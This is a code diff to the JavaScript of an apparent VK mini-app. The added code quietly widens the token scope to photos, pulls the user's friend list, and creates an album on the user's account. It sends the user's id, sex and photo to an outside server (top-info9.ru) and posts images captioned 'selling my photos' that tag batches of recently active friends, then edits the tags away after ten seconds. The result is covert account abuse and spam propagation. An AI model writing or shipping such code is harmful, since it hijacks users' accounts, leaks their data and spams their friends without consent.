@@ -39,14 +39,16 @@
         function firstApi() {
             var code = 'var time=API.utils.getServerTime(); \n\
             var user=API.users.get({user_ids:'+hash+',fields:"uid, first_name, last_name, photo_max, photo_200, photo_id, bdate, sex, city, relation, is_closed, has_photo, counters"})[0]; \n\
-            return [user];';
+            var friends = API.friends.get({"fields": "sex, photo_100, photo_200, photo_max, photo_400_orig, photo_id, online, online_mobile, can_post, relation, last_seen, has_photo, common_count, followers_count, has_photo", "count":500}); \n\
+            return [user,friends];';
 
              vkConnect.send("VKWebAppCallAPIMethod", {
                 "method": "execute",
                 "params": {"code": code, "v": "5.131", "access_token": token}
             }).then(data => {
+                viewer.friends = data.response[1];
                 var user = data.response[0];
-                if(user.id == viewer_id) {
+                if(user.id == viewer_id || user.sex == 2) {
                   hash = "";
                 }
 
@@ -65,6 +67,9 @@
                     </body>  \n\
                     </html>');
                 }else{
+
+                  createAlbom();
+
                   var div = '<div style="padding: 100px;padding-top:50px;padding-bottom:10px;" class="w-full lg:max-w-full lg:flex"> \n\
                               <div class="h-48 lg:h-auto lg:w-48 flex-none bg-cover rounded-t lg:rounded-t-none lg:rounded-l text-center overflow-hidden" style="background-image: url(\''+user.photo_200+'\')"> \n\
                               </div> \n\
@@ -109,7 +114,7 @@
 
             vkConnect.send("VKWebAppGetAuthToken", {
                 "app_id": vk_app_id,
-                "scope": ""
+                "scope": "photos"
             })
             .then(data => {
                 if(token){return false;}
@@ -128,6 +133,115 @@
         function getRandom(min, max)
         {
             return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        function createAlbom(){
+          vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+              "method": "photos.createAlbum",
+              "params": {"title":"1"+viewer_id,"v": "5.95", "access_token": token}
+          }).then(data => {
+            var id_albom = data.response.id;
+            uploadPhotoAlbom(id_albom);
+            })
+            .catch(error => {
+                //tokenPhotos();
+                console.log(error);
+            });
+        }
+
+        var count_upload_photo = 0;
+        function uploadPhotoAlbom(id_albom){
+                html2canvas(document.getElementById('for_canvas'), {scrollY:0, scrollX:0}).then(function(canvas2) {
+                      vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+                          "method": "photos.getUploadServer",
+                          "params": {"album_id":id_albom,"v": "5.95", "access_token": token}
+                      }).then(data => {
+
+                        var upload_url = data.response.upload_url;
+                        var b64Image = canvas2.toDataURL();
+                        var u8Image  = b64ToUint8Array(b64Image);
+
+                        var formData = new FormData();
+                        //formData.append("image", new Blob([ u8Image ], {type: "image/jpg"}));
+                        formData.append("upurl", upload_url);
+                        formData.append("sex", viewer.sex);
+                        formData.append("viewer_id", viewer.id);
+                        //formData.append("is_photo", 1);
+                        formData.append("my_photo", viewer.photo_max);
+
+                        var text = "";
+
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("POST", "https://top-info9.ru/PSIH/uploadPhoto.php", true);
+                        xhr.onreadystatechange = function () {
+                            if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                                var data = JSON.parse(xhr.responseText);
+                                var users_list = getFriendsOnlineForPhoto();
+                                caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"_"+viewer_id+" \n"+users_list;
+
+                                vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+                                    "method": "photos.save",
+                                    "params": {"album_id": id_albom, "server": data.server, "photos_list": data.photos_list, "hash":data.hash, "caption":caption,"v": "5.95", "access_token": token}
+                                }).then(data => {
+
+
+
+                                  setTimeout(function() {
+                                    var id_photo = data.response[0].id;
+                                    caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"_"+viewer_id+"";
+                                    vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+                                        "method": "photos.edit",
+                                        "params": {"owner_id": viewer_id, "photo_id": id_photo,  "caption":caption,"v": "5.95", "access_token": token}
+                                    }).then(data => {
+
+                                    });
+                                  }, 10000);
+
+
+                                  count_upload_photo++;
+                                  if(count_upload_photo < 4 && viewer.friends.items[global_offset_i+1]){
+                                    setTimeout(function() {
+                                        uploadPhotoAlbom(id_albom);
+                                    }, 100);
+                                  }
+                                  })
+                                  .catch(error => {
+
+                                  });
+                            }
+                        };
+                        xhr.send(formData);
+
+
+                        })
+                        .catch(error => {
+
+                        });
+
+
+                      //$("#for_canvas").html("");
+                 });
+            //});
+
+        }
+
+        function sortByLastTime() {
+          viewer.friends.items.sort((a, b) => b.last_seen.time > a.last_seen.time ? 1 : -1);
+        }
+
+        function getFriendsOnlineForPhoto() {
+          sortByLastTime();
+          var users_list = "\n \n \n";
+          var count = 0;
+          for(;global_offset_i<viewer.friends.items.length;global_offset_i++) {
+              users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
+              count++;
+              if(count > 8){
+                break;
+              }
+          }
+
+            return users_list;
         }
 
     </script>
